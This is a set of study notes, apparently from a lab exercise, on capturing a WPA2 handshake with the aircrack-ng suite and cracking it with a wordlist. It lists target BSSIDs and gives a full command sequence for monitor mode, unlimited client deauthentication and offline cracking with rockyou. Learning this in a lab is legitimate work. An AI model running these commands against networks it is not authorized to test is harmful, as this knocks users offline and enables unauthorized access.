# Wi‑Fi WPA2 Hacking - aircrack

## Metadata
- **BSSID:** 86:B1:10:7F:20:9A (86b1107f209a)
- **Channel:** 6
- **ESSID:** FS08

## EPSIC
B0:EA:BC:13:F8:20  -71        1       40   18  11  195   WPA2 CCMP   PSK  WN-13F820 

- APple AirPort Extreme 802.11n
- SSID : Wifi-Lab
- pas dans une wordlist
78:CA:39:43:10:DF 6 WPA2 Wifi-182 

## 🧠 S — Summary
Capture a WPA2 four‑way handshake from a target AP using the aircrack‑ng suite, then attempt cracking with a wordlist. The typical workflow is putting the wireless interface into monitor mode, sniffing for EAPOL handshakes, optionally forcing client deauthentications, and finally running `aircrack-ng` or similar on the capture file.

## 🔍 Theory
WPA2 uses a four‑way handshake to derive a fresh pairwise transient key (PTK) between the client (supplicant) and access point (authenticator):

1. **PMK derivation** – both sides derive a Pairwise Master Key from the pre‑shared key (PSK) or 802.1X/EAP exchange.
2. **Message 1** – AP sends ANonce (a random value) to the client.
3. **Message 2** – Client replies with SNonce and a MIC proving knowledge of the PMK.
4. **Message 3** – AP sends the GTK (group key) encrypted and a MIC.
5. **Message 4** – Client confirms completion.

Capturing messages 1–4 (especially 2 and 4) allows an attacker to brute‑force the PSK offline: guess a passphrase, derive the PMK/PTK, and check the MICs. `aircrack-ng` automates these steps. Handshakes occur during normal association or can be triggered by deauthenticating an associated client.

## 🧰 T — Tools
- `airmon-ng`, `airodump-ng`, `aireplay-ng` (aircrack‑ng suite for monitor mode and injection)
- `aircrack-ng` (cracks the handshake)
- `wireshark` (inspect captures and verify EAPOL frames)
- `NetworkManager`, `wpa_supplicant` (services to stop/start during capture)

## 💣 E — Exploits / Examples
```bash
# prepare interface
sudo airmon-ng check kill          # stop interfering processes
sudo airmon-ng start wlan0         # enable monitor mode
iw dev                              # confirm wlan0mon exists

# identify target
sudo airodump-ng wlan0mon
# note BSSID, CH and ESSID when they appear

# capture handshake
sudo airodump-ng -w captures --bssid <BSSID> wlan0mon
# watch for "WPA Handshake" indicator

# optional deauth attack to trigger handshake
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon

# verify handshake in Wireshark
wireshark captures-01.cap
# filter 'eapol' and ensure messages 1–4 exist

# terminate monitor mode when done
sudo airmon-ng stop wlan0mon
```

## ✏️ P — Practice Notes
- Write down BSSID, channel and ESSID before capturing.
- After capture, restore network services:
  ```bash
  sudo systemctl restart NetworkManager
  sudo systemctl restart wpa_supplicant
  ```
- If you reboot or restart the lab VM, repeat `sudo airmon-ng stop wlan0mon` and service restarts as needed.
- Use the `-w` option of `aircrack-ng` with large wordlists like `/usr/share/wordlists/rockyou.txt`.

## 🧾 S — Scripts / Snippets

### Step-by-step procedure

1. Enable monitor mode on the Wi‑Fi adapter:
   ```bash
   sudo airmon-ng start wlan0
   ```
2. Check interface status:
   ```bash
   iw dev
   ```
3. Stop network services that may interfere:
   ```bash
   sudo airmon-ng check kill
   ```
4. Start `airodump-ng` to watch for the target:
   ```bash
   sudo airodump-ng wlan0mon
   ```
5. Once target appears, start capture with BSSID filter:
   ```bash
   sudo airodump-ng -w captures --bssid <BSSID> wlan0mon
   ```
6. Watch for "WPA Handshake" in the header; if none, deauthenticate a client:
   ```bash
   sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
   ```
7. After handshake captured, stop the monitor interface:
   ```bash
   sudo airmon-ng stop wlan0mon
   ```
8. Restart network services:
   ```bash
   sudo systemctl restart NetworkManager
   sudo systemctl restart wpa_supplicant
   ```
9. Crack the handshake:
   ```bash
   sudo aircrack-ng captures-01.cap -w /usr/share/wordlists/rockyou.txt
   ```

Replace interface names, filenames, and channel values to match your environment.

---
> Tip: Copy the S.T.E.P.S. template from `notes/README.md` for new notes to keep consistency.
